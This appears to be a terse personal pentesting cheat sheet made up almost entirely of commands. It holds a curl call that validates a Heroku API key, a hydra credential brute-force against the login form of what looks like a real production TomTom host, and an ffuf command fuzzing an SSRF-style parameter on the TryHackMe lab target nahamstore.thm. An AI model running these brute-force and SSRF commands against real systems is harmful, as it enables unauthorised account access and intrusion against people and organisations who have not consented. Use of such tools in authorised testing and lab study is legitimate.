

Heroku API check 
`curl -X POST https://api.heroku.com/apps -H "Accept: application/vnd.heroku+json; version=3" -H "Authorization: Bearer $HEROKU_API_KEY"`

hydra usage/ Authentication bypass
`sudo hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P password-biglist.txt -u -f  minimap-fusion.prod.lt.tomtom-global.com  https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials" -V -t 64`


`ffuf -u 'http://nahamstore.thm/stockcheck' -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -X POST -d 'product_id=2&server=stock.nahamstore.thm@FUZZ.nahamstore.thm#' -od ./valid_responses  `
-fw is meant to filter out and is mw is for matching the word length

